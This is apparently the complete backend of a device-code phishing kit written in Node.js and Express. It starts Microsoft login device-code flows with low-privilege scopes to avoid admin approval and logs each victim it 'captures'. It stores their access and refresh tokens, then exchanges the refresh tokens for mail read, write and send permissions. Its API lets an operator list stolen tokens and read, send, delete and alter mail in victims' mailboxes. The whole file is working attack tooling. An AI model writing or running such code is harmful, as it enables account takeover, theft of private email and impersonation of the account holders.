const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// YOUR EXISTING CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

// Store tokens
let accessTokens = [];
let refreshTokens = [];
let pendingAuth = new Map();

function generateId() {
    return Date.now() + Math.floor(Math.random() * 10000);
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START AUTHENTICATION - BASIC SCOPES ONLY (No Admin Approval)
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        // ONLY basic scopes - NO Mail scopes to avoid admin approval
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sessionId, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling for token
        pollForToken(device_code, sessionId);
        
        res.json({
            userCode: user_code,
            deviceCode: device_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('Start error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            
            // Store Access Token
            accessTokens.push({
                id: generateId(),
                user: userEmail,
                name: userName,
                type: 'Access Token',
                accesstoken: tokens.access_token,
                issued_at: new Date().toISOString(),
                expires_at: new Date(Date.now() + (tokens.expires_in * 1000)).toISOString()
            });
            
            // Store Refresh Token (PRT) - THIS IS THE KEY!
            if (tokens.refresh_token) {
                refreshTokens.push({
                    id: generateId(),
                    user: userEmail,
                    name: userName,
                    type: 'PRT (Refresh Token)',
                    refreshtoken: tokens.refresh_token
                });
            }
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ CAPTURED: ${userEmail}`);
            console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
            console.log(`   PRT: ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
            
        } catch (err) {}
    }, 3000);
}

// ============================================
// STATUS ENDPOINT
// ============================================
app.get('/state', async (req, res) => {
    const deviceCode = req.query.device_code;
    const pending = pendingAuth.get(deviceCode);
    
    if (pending) {
        if (pending.status === 'success') {
            return res.json({ status: 'success' });
        }
    }
    res.json({ status: 'pending' });
});

// ============================================
// GET FRESH ACCESS TOKEN USING PRT
// This can request Mail scopes because it's using the PRT
// ============================================
async function getFreshAccessToken(userEmail) {
    const userPRT = refreshTokens.find(rt => rt.user === userEmail);
    if (!userPRT) {
        console.log(`No PRT found for ${userEmail}`);
        return null;
    }
    
    try {
        console.log(`🔄 Getting fresh token for ${userEmail} using PRT...`);
        
        // Now we can request Mail scopes because we're using the PRT
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: userPRT.refreshtoken,
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = response.data;
        
        // Update stored access token
        const existingToken = accessTokens.find(t => t.user === userEmail);
        if (existingToken) {
            existingToken.accesstoken = tokens.access_token;
            existingToken.expires_at = new Date(Date.now() + (tokens.expires_in * 1000)).toISOString();
        }
        
        console.log(`✅ Fresh token obtained for ${userEmail}`);
        return tokens.access_token;
        
    } catch (err) {
        console.error(`Failed to refresh token for ${userEmail}:`, err.message);
        return null;
    }
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/api/list_access_tokens', (req, res) => {
    res.json(accessTokens);
});

app.get('/api/list_refresh_tokens', (req, res) => {
    res.json(refreshTokens);
});

app.delete('/api/delete_access_token/:id', (req, res) => {
    const index = accessTokens.findIndex(t => t.id == req.params.id);
    if (index !== -1) {
        accessTokens.splice(index, 1);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

app.delete('/api/delete_refresh_token/:id', (req, res) => {
    const index = refreshTokens.findIndex(t => t.id == req.params.id);
    if (index !== -1) {
        refreshTokens.splice(index, 1);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

app.get('/api/sessions', (req, res) => {
    const sessions = accessTokens.map(t => ({
        id: t.id,
        email: t.user,
        name: t.name,
        capturedAt: t.issued_at,
        expiresAt: t.expires_at,
        type: t.type
    }));
    res.json({ sessions: sessions, total: sessions.length });
});

app.delete('/api/sessions/clear', (req, res) => {
    accessTokens = [];
    refreshTokens = [];
    res.json({ success: true });
});

// ============================================
// MAILBOX API - Uses PRT to get fresh token with Mail scopes
// ============================================

app.get('/api/mail/folders/:email', async (req, res) => {
    const { email } = req.params;
    const token = await getFreshAccessToken(email);
    
    if (!token) {
        return res.status(401).json({ error: 'No valid token. User needs to authenticate first.' });
    }
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch folders: ' + (err.response?.data?.error?.message || err.message) });
    }
});

app.get('/api/mail/:email/:folderId', async (req, res) => {
    const { email, folderId } = req.params;
    const token = await getFreshAccessToken(email);
    
    if (!token) {
        return res.status(401).json({ error: 'No valid token' });
    }
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

app.get('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    
    if (!token) {
        return res.status(401).json({ error: 'No valid token' });
    }
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,conversationId' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.post('/api/mail/send/:email', async (req, res) => {
    const { email } = req.params;
    const { to, subject, body } = req.body;
    const token = await getFreshAccessToken(email);
    
    if (!token) {
        return res.status(401).json({ error: 'No valid token' });
    }
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(addr => ({ emailAddress: { address: addr } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    
    if (!token) {
        return res.status(401).json({ error: 'No valid token' });
    }
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const { isRead } = req.body;
    const token = await getFreshAccessToken(email);
    
    if (!token) {
        return res.status(401).json({ error: 'No valid token' });
    }
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update' });
    }
});

// ============================================
// SETTINGS API
// ============================================
let config = {
    active_resource: 'graph',
    api_version: '2',
    openai_enabled: false,
    openai_api_key: '',
    openai_model: 'gpt-3.5-turbo',
    openai_max_tokens: 500,
    openai_temperature: 0.7
};

app.get('/api/settings', (req, res) => {
    res.json(config);
});

app.post('/api/settings', (req, res) => {
    config = { ...config, ...req.body };
    res.json({ success: true });
});

app.get('/api/resource/settings', (req, res) => {
    res.json({ success: true, active_resource: config.active_resource, api_version: config.api_version });
});

app.post('/api/resource/settings', (req, res) => {
    config.active_resource = req.body.active_resource;
    config.api_version = req.body.api_version;
    res.json({ success: true });
});

app.post('/api/openai/settings', (req, res) => {
    config.openai_enabled = req.body.enabled;
    config.openai_api_key = req.body.api_key;
    config.openai_model = req.body.model;
    config.openai_max_tokens = req.body.max_tokens;
    config.openai_temperature = req.body.temperature;
    res.json({ success: true });
});

// ============================================
// SERVE FILES
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Client ID: ${YOUR_CLIENT_ID}`);
    console.log(`✅ Using basic scopes (no admin approval needed)`);
    console.log(`✅ PRT will be captured and used for Mail access`);
    console.log(`========================================\n`);
});
